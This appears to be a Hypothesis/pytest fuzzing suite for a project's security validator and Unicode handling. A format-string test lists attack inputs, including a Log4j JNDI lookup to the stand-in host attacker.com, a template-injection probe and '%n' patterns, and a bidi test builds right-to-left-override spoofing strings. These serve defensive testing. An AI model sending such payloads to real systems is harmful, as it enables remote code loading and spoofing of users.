#!/usr/bin/env python3
"""
ULTRA-FUZZING Test Suite
Throw millions of random inputs at the system to find edge cases
"""

import string
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import unicodedata

from hypothesis import given, settings
from hypothesis import strategies as st
from hypothesis.stateful import Bundle, RuleBasedStateMachine, invariant, rule

from src.core.globalid import GlobalIDGenerator
from src.core.security_validator import SecurityValidator
from src.core.unicode_handler import UnicodeNormalizer
from src.regions.manager_optimized import RegionManager


class TestUltraFuzzing:
    """
    Fuzzing tests that generate millions of test cases automatically
    """

    @classmethod
    def setup_class(cls):
        cls.validator = SecurityValidator()
        cls.unicode_handler = UnicodeNormalizer()
        cls.globalid_gen = GlobalIDGenerator()
        try:
            cls.region_manager = RegionManager(Path("./config"))
        except:
            cls.region_manager = None

    @given(st.text(min_size=0, max_size=10000))
    @settings(max_examples=1000, deadline=1000)
    @pytest.mark.timeout(15)
    def test_fuzz_security_validator_random_text(self, text):
        """Fuzz security validator with random text"""
        try:
            result = self.validator.validate_string(text, "fuzz")
            # Should return something
            assert result is not None
            # Should not be longer than input (unless escape sequences)
            assert len(result) <= len(text) * 10  # Allow for escaping
        except Exception as e:
            # Security errors are expected for malicious input
            assert "SecurityError" in str(type(e)) or "Security" in str(e)

    @given(st.binary(min_size=0, max_size=1000))
    @settings(max_examples=1000, deadline=1000)
    @pytest.mark.timeout(15)
    def test_fuzz_security_validator_binary(self, data):
        """Fuzz with raw binary data"""
        try:
            # Try to decode as various encodings
            for encoding in ["utf-8", "latin-1", "utf-16", "ascii"]:
                try:
                    text = data.decode(encoding, errors="ignore")
                    result = self.validator.validate_string(text, "binary_fuzz")
                    assert result is not None
                except:
                    pass  # Expected for invalid encodings
        except:
            pass  # Binary data might not be decodable

    @given(
        st.lists(
            st.one_of(
                st.text(alphabet=string.ascii_letters),
                st.text(alphabet=string.digits),
                st.text(alphabet=string.punctuation),
                st.text(alphabet=string.whitespace),
                st.text(min_size=1, max_size=10),  # Unicode
            ),
            min_size=0,
            max_size=100,
        )
    )
    @settings(max_examples=500, deadline=2000)
    @pytest.mark.timeout(15)
    def test_fuzz_mixed_character_sets(self, parts):
        """Fuzz with mixed character sets"""
        text = "".join(parts)
        try:
            result = self.validator.validate_string(text, "mixed_fuzz")
            assert result is not None
        except Exception as e:
            # Security exceptions are fine
            assert "Security" in str(e) or "Security" in str(type(e))

    @given(
        st.dictionaries(
            st.text(min_size=1, max_size=50),
            st.one_of(
                st.text(),
                st.integers(),
                st.floats(allow_nan=False, allow_infinity=False),
                st.booleans(),
                st.none(),
            ),
            min_size=0,
            max_size=20,
        )
    )
    @settings(max_examples=500, deadline=2000)
    @pytest.mark.timeout(15)
    def test_fuzz_globalid_generation(self, entry):
        """Fuzz GlobalID generation with random entries"""
        try:
            # Convert dict to proper entry format
            if "CanonicalLatin" not in entry:
                entry["CanonicalLatin"] = "Test"
            if "CanonicalNative" not in entry:
                entry["CanonicalNative"] = entry.get("CanonicalLatin", "Test")

            global_id = self.globalid_gen.generate(entry)

            # Verify format
            assert global_id is not None
            assert len(global_id) > 0
            assert global_id.startswith("GMN")

        except Exception:
            # Some inputs might be invalid
            pass

    @given(st.text())
    @settings(max_examples=500, deadline=1000)
    @pytest.mark.timeout(15)
    def test_fuzz_unicode_normalization(self, text):
        """Fuzz Unicode normalization"""
        try:
            normalized = self.unicode_handler.normalize(text)

            # Should be idempotent
            double_normalized = self.unicode_handler.normalize(normalized)
            assert normalized == double_normalized

            # Should be valid Unicode
            assert isinstance(normalized, str)

            # Should preserve length roughly (allowing for normalization)
            assert len(normalized) <= len(text) * 3  # Some chars expand

        except Exception:
            pass  # Some Unicode might be invalid

    @given(st.integers(min_value=-sys.maxsize, max_value=sys.maxsize))
    @settings(max_examples=1000, deadline=500)
    @pytest.mark.timeout(15)
    def test_fuzz_integer_inputs(self, num):
        """Fuzz with integer edge cases"""
        text = str(num)
        try:
            result = self.validator.validate_string(text, "integer_fuzz")
            assert result is not None
        except:
            pass  # Large numbers might be rejected

    @given(st.floats(allow_nan=True, allow_infinity=True))
    @settings(max_examples=1000, deadline=500)
    @pytest.mark.timeout(15)
    def test_fuzz_float_inputs(self, num):
        """Fuzz with float edge cases including NaN and Inf"""
        text = str(num)
        try:
            result = self.validator.validate_string(text, "float_fuzz")
            assert result is not None
        except:
            pass  # Special floats might be rejected

    @pytest.mark.timeout(15)
    def test_fuzz_unicode_categories(self):
        """Test every Unicode category"""
        categories = [
            "Cc",
            "Cf",
            "Cn",
            "Co",
            "Cs",  # Control
            "Ll",
            "Lm",
            "Lo",
            "Lt",
            "Lu",  # Letters
            "Mc",
            "Me",
            "Mn",  # Marks
            "Nd",
            "Nl",
            "No",  # Numbers
            "Pc",
            "Pd",
            "Pe",
            "Pf",
            "Pi",
            "Po",
            "Ps",  # Punctuation
            "Sc",
            "Sk",
            "Sm",
            "So",  # Symbols
            "Zl",
            "Zp",
            "Zs",  # Separators
        ]

        for category in categories:
            # Find characters in this category
            chars = []
            for i in range(0x10000):  # BMP only for speed
                try:
                    char = chr(i)
                    if unicodedata.category(char) == category:
                        chars.append(char)
                        if len(chars) >= 10:  # Sample 10 chars per category
                            break
                except:
                    pass

            # Test with these characters
            for char in chars:
                test_str = f"Test{char}String"
                try:
                    result = self.validator.validate_string(
                        test_str, f"unicode_{category}"
                    )
                    assert result is not None
                except:
                    pass  # Some categories might be rejected

    @pytest.mark.timeout(15)
    def test_fuzz_zero_width_characters(self):
        """Fuzz with zero-width and invisible characters"""
        zero_width_chars = [
            "\u200b",  # Zero-width space
            "\u200c",  # Zero-width non-joiner
            "\u200d",  # Zero-width joiner
            "\ufeff",  # Zero-width no-break space
            "\u2060",  # Word joiner
            "\u180e",  # Mongolian vowel separator
            "\u2000",
            "\u2001",
            "\u2002",
            "\u2003",  # Various spaces
            "\u2004",
            "\u2005",
            "\u2006",
            "\u2007",
            "\u2008",
            "\u2009",
            "\u200a",
        ]

        for char in zero_width_chars:
            for position in ["start", "middle", "end", "multiple"]:
                if position == "start":
                    test = f"{char}TestString"
                elif position == "middle":
                    test = f"Test{char}String"
                elif position == "end":
                    test = f"TestString{char}"
                else:
                    test = f"{char}Test{char}String{char}"

                try:
                    result = self.validator.validate_string(test, "zero_width")
                    # Zero-width chars should be handled
                    assert result is not None
                except:
                    pass

    @pytest.mark.timeout(15)
    def test_fuzz_combining_characters(self):
        """Fuzz with combining characters and diacritics"""
        base_chars = ["a", "e", "i", "o", "u", "n", "c", "s"]
        combining_marks = [
            "\u0300",  # Grave accent
            "\u0301",  # Acute accent
            "\u0302",  # Circumflex
            "\u0303",  # Tilde
            "\u0308",  # Diaeresis
            "\u030a",  # Ring above
            "\u030c",  # Caron
            "\u0327",  # Cedilla
        ]

        for base in base_chars:
            for mark in combining_marks:
                # Single combining
                test1 = f"Test{base}{mark}String"
                # Multiple combining
                test2 = f"Test{base}{mark}{mark}String"
                # Excessive combining (DoS attempt)
                test3 = f"Test{base}{mark * 100}String"

                for test in [test1, test2, test3]:
                    try:
                        result = self.validator.validate_string(test, "combining")
                        assert result is not None
                    except Exception as e:
                        # Excessive combining should be rejected
                        if mark * 100 in test:
                            assert "Security" in str(e) or "combining" in str(e).lower()

    @pytest.mark.timeout(15)
    def test_fuzz_bidi_characters(self):
        """Fuzz with bidirectional text override characters"""
        bidi_chars = [
            "\u202a",  # Left-to-right embedding
            "\u202b",  # Right-to-left embedding
            "\u202c",  # Pop directional formatting
            "\u202d",  # Left-to-right override
            "\u202e",  # Right-to-left override
            "\u2066",  # Left-to-right isolate
            "\u2067",  # Right-to-left isolate
            "\u2068",  # First strong isolate
            "\u2069",  # Pop directional isolate
        ]

        for char in bidi_chars:
            # These can be used for spoofing attacks
            test_cases = [
                f"test{char}txt.exe",  # Extension spoofing
                f"admin{char}user",  # Identity spoofing
                f"hello{char}world{char}",  # Multiple overrides
            ]

            for test in test_cases:
                try:
                    self.validator.validate_string(test, "bidi")
                    # Should detect and handle bidi attacks
                except Exception as e:
                    # These should be caught as security issues
                    assert "Security" in str(e) or "direction" in str(e).lower()

    @pytest.mark.timeout(15)
    def test_fuzz_control_characters(self):
        """Fuzz with control characters"""
        for i in range(32):  # All ASCII control chars
            if i in [9, 10, 13]:  # Tab, LF, CR might be allowed
                continue

            char = chr(i)
            test_cases = [
                f"{char}test",
                f"test{char}",
                f"te{char}st",
            ]

            for test in test_cases:
                try:
                    self.validator.validate_string(test, "control")
                    # Most control chars should be rejected
                    assert False, f"Control char {i} was not rejected"
                except Exception as e:
                    # Should be caught as dangerous
                    assert "Security" in str(e) or "control" in str(e).lower()

    @pytest.mark.timeout(15)
    def test_fuzz_format_strings(self):
        """Fuzz with format string patterns"""
        format_patterns = [
            "%s" * 100,
            "%x" * 100,
            "%n" * 10,
            "%.99999999s",
            "%*.*s",
            "${jndi:ldap://attacker.com/a}",  # Log4j style
            "${{7*7}}",  # Template injection
            "%(foo)s",  # Python format
            "{0}",  # Python format
            "$var",  # Shell variable
        ]

        for pattern in format_patterns:
            try:
                self.validator.validate_string(pattern, "format")
                # Some might be allowed if not dangerous
            except:
                pass  # Format strings might be rejected

    @given(
        st.lists(st.integers(min_value=0, max_value=1114111), min_size=0, max_size=100)
    )
    @settings(max_examples=500, deadline=1000)
    @pytest.mark.timeout(15)
    def test_fuzz_random_unicode_codepoints(self, codepoints):
        """Fuzz with random Unicode codepoints"""
        try:
            # Filter out surrogates and non-characters
            valid_codepoints = [
                cp
                for cp in codepoints
                if not (0xD800 <= cp <= 0xDFFF)  # Surrogates
                and cp <= 0x10FFFF  # Valid Unicode range
            ]

            text = "".join(chr(cp) for cp in valid_codepoints if cp != 0)

            if text:
                result = self.validator.validate_string(text, "codepoint_fuzz")
                assert result is not None
        except:
            pass  # Invalid Unicode is expected to fail

    @pytest.mark.timeout(15)
    def test_fuzz_emoji_and_symbols(self):
        """Fuzz with emoji and special symbols"""
        emoji_ranges = [
            (0x1F300, 0x1F5FF),  # Miscellaneous Symbols and Pictographs
            (0x1F600, 0x1F64F),  # Emoticons
            (0x1F680, 0x1F6FF),  # Transport and Map Symbols
            (0x1F900, 0x1F9FF),  # Supplemental Symbols and Pictographs
            (0x2600, 0x26FF),  # Miscellaneous Symbols
            (0x2700, 0x27BF),  # Dingbats
        ]

        for start, end in emoji_ranges:
            # Sample some emoji from each range
            for cp in range(start, min(start + 10, end + 1)):
                try:
                    char = chr(cp)
                    test_cases = [
                        char,
                        f"Test{char}",
                        f"{char}Test",
                        f"Te{char}st",
                        char * 10,  # Repeated emoji
                    ]

                    for test in test_cases:
                        result = self.validator.validate_string(test, "emoji")
                        assert result is not None
                except:
                    pass  # Some symbols might not be valid


class StatefulFuzzingTest(RuleBasedStateMachine):
    """
    Stateful property-based testing
    Tests sequences of operations to find bugs in state handling
    """

    def __init__(self):
        super().__init__()
        self.validator = SecurityValidator()
        self.entries = Bundle("entries")
        self.validated = {}
        self.counter = 0

    @rule(
        text=st.text(),
        context=st.sampled_from(["test", "name", "general", "email", "url"]),
    )
    def validate_string(self, text, context):
        """Validate a string and track it"""
        self.counter += 1
        key = f"entry_{self.counter}"

        try:
            result = self.validator.validate_string(text, context)
            self.validated[key] = {
                "input": text,
                "output": result,
                "context": context,
                "error": None,
            }
        except Exception as e:
            self.validated[key] = {
                "input": text,
                "output": None,
                "context": context,
                "error": str(e),
            }

    @rule()
    def clear_some_entries(self):
        """Clear some entries to test memory handling"""
        if len(self.validated) > 10:
            # Remove half
            keys = list(self.validated.keys())
            for key in keys[: len(keys) // 2]:
                del self.validated[key]

    @invariant()
    def check_consistency(self):
        """Check that validation is consistent"""
        for key, entry in self.validated.items():
            if entry["output"] is not None:
                # Re-validate should give same result
                try:
                    result = self.validator.validate_string(
                        entry["input"], entry["context"]
                    )
                    assert result == entry["output"], "Validation not consistent"
                except Exception:
                    assert entry["error"] is not None, "Error state changed"

    @invariant()
    def check_memory_usage(self):
        """Check that we're not leaking memory"""
        import gc

        gc.collect()
        # This is a rough check - in production you'd want more sophisticated monitoring
        objects = len(gc.get_objects())
        assert objects < 100000, f"Too many objects in memory: {objects}"


if __name__ == "__main__":
    # Run the stateful test
    test = StatefulFuzzingTest.TestCase
    test.runTest = lambda self: None
    state_machine = test()
    state_machine.run()

    # Run the regular tests
    pytest.main([__file__, "-v", "--tb=short"])
